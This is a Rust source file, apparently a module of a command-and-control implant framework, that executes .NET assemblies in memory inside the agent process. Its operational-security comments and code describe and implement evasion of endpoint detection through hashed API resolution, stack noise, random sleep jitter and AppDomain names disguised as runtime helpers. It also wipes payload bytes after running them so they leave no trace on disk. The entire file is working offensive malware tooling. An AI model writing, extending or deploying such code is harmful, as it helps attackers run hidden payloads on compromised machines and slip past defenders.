//! L2 `mod_dotnet` — on-demand in-memory .NET assembly execution.
//!
//! OPSEC notes (same-process CLR host — EDR will attribute to agent PID):
//! - Load only on demand; unload after window when possible
//! - Uses PEB-hashed COM/CLR resolution from cupcake-core (no fixed IAT for LoadLibrary paths)
//! - Random AppDomain name + pre-exec jitter/stack noise
//! - Prefer not to leave assembly bytes on disk (payload stays in RAM envelope)
//!
//! Payload JSON:
//! ```json
//! { "data": "<base64 assembly>", "args": "arg1 arg2" }
//! ```
//! or `"args": ["a","b"]`

use base64::Engine;
use std::sync::OnceLock;
use tokio::runtime::Runtime;

fn runtime() -> &'static Runtime {
    static RT: OnceLock<Runtime> = OnceLock::new();
    RT.get_or_init(|| {
        tokio::runtime::Builder::new_current_thread()
            .enable_all()
            .build()
            .expect("mod_dotnet rt")
    })
}

fn opsec_pre_exec() {
    #[cfg(all(windows, target_arch = "x86_64"))]
    {
        cupcake_core::stealth::stack::add_stack_noise();
    }
    let n = (std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.subsec_nanos())
        .unwrap_or(0)
        % 200_000_000)
        + 40_000_000;
    std::thread::sleep(std::time::Duration::from_nanos(n as u64));
}

/// Non-obvious AppDomain label (avoid "Cupcake" / "C2" strings).
fn random_domain_name() -> String {
    let t = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_nanos())
        .unwrap_or(0);
    // Looks like a runtime helper domain
    format!("DefaultDomain_{:x}", (t as u32).wrapping_mul(0x9E37_79B9))
}

#[no_mangle]
pub extern "C" fn mod_init() -> i32 {
    let _ = runtime();
    opsec_pre_exec();
    0
}

#[no_mangle]
pub unsafe extern "C" fn mod_invoke(
    cmd_type: *const u8,
    cmd_type_len: u32,
    payload: *const u8,
    payload_len: u32,
    out_ptr: *mut *mut u8,
    out_len: *mut u32,
) -> i32 {
    if out_ptr.is_null() || out_len.is_null() {
        return -1;
    }
    *out_ptr = std::ptr::null_mut();
    *out_len = 0;

    let ct = slice_str(cmd_type, cmd_type_len).unwrap_or("execute_assembly");
    if ct != "execute_assembly" && ct != "dotnet" && ct != "execute-assembly" {
        return write_json(
            out_ptr,
            out_len,
            "",
            &format!("mod_dotnet: unsupported '{ct}'"),
        );
    }

    let body = match slice_bytes(payload, payload_len) {
        Some(b) => b,
        None => return write_json(out_ptr, out_len, "", "empty payload"),
    };

    let (mut asm, args) = match parse_dotnet_payload(body) {
        Ok(v) => v,
        Err(e) => return write_json(out_ptr, out_len, "", &e),
    };

    opsec_pre_exec();
    let domain = random_domain_name();

    #[cfg(windows)]
    {
        let result = runtime().block_on(async {
            cupcake_core::dotnet::DotNetExecutor::execute_assembly(
                asm.clone(),
                args,
                Some(domain.as_str()),
            )
            .await
        });
        // 用完即焚：清零程序集字节；AppDomain 在 DotNetExecutor 内 UnloadDomain
        for b in asm.iter_mut() {
            *b = 0;
        }
        write_json(out_ptr, out_len, &result.stdout, &result.stderr)
    }
    #[cfg(not(windows))]
    {
        for b in asm.iter_mut() {
            *b = 0;
        }
        let _ = (args, domain);
        write_json(out_ptr, out_len, "", "dotnet: windows only")
    }
}

#[no_mangle]
pub unsafe extern "C" fn mod_free(ptr: *mut u8, len: u32) {
    if ptr.is_null() || len == 0 {
        return;
    }
    let _ = Vec::from_raw_parts(ptr, len as usize, len as usize);
}

#[no_mangle]
pub extern "C" fn mod_shutdown() -> i32 {
    0
}

fn parse_dotnet_payload(body: &[u8]) -> Result<(Vec<u8>, Vec<String>), String> {
    if let Ok(v) = serde_json::from_slice::<serde_json::Value>(body) {
        let data_b64 = v
            .get("data")
            .and_then(|x| x.as_str())
            .ok_or_else(|| "missing data (base64 assembly)".to_string())?;
        let asm = base64::engine::general_purpose::STANDARD
            .decode(data_b64.trim())
            .map_err(|e| format!("assembly b64: {e}"))?;
        if asm.len() < 2 || &asm[0..2] != b"MZ" {
            return Err("assembly missing MZ".into());
        }
        let args = match v.get("args") {
            Some(serde_json::Value::Array(a)) => a
                .iter()
                .filter_map(|x| x.as_str().map(|s| s.to_string()))
                .collect(),
            Some(serde_json::Value::String(s)) => {
                if s.trim().is_empty() {
                    Vec::new()
                } else {
                    shell_words_split(s)
                }
            }
            _ => Vec::new(),
        };
        return Ok((asm, args));
    }
    // Raw PE bytes
    if body.len() >= 2 && &body[0..2] == b"MZ" {
        return Ok((body.to_vec(), Vec::new()));
    }
    Err("expected JSON {data,args} or raw MZ assembly".into())
}

/// Minimal split: whitespace, no full shell quoting.
fn shell_words_split(s: &str) -> Vec<String> {
    s.split_whitespace().map(|x| x.to_string()).collect()
}

/// Lifetime is tied to the caller's buffers (cmd/payload) — not truly 'static.
unsafe fn slice_str<'a>(p: *const u8, len: u32) -> Option<&'a str> {
    if p.is_null() || len == 0 {
        return None;
    }
    std::str::from_utf8(std::slice::from_raw_parts(p, len as usize)).ok()
}

unsafe fn slice_bytes<'a>(p: *const u8, len: u32) -> Option<&'a [u8]> {
    if p.is_null() || len == 0 {
        return None;
    }
    Some(std::slice::from_raw_parts(p, len as usize))
}

/// Heap buffer for host: always shrink_to_fit so len==cap for mod_free.
unsafe fn write_json(out_ptr: *mut *mut u8, out_len: *mut u32, stdout: &str, stderr: &str) -> i32 {
    let v = serde_json::json!({ "stdout": stdout, "stderr": stderr, "path": null });
    let mut bytes = match serde_json::to_vec(&v) {
        Ok(b) => b,
        Err(_) => return -4,
    };
    bytes.shrink_to_fit();
    debug_assert_eq!(bytes.len(), bytes.capacity());
    let len = bytes.len() as u32;
    let ptr = bytes.as_mut_ptr();
    std::mem::forget(bytes);
    *out_ptr = ptr;
    *out_len = len;
    0
}
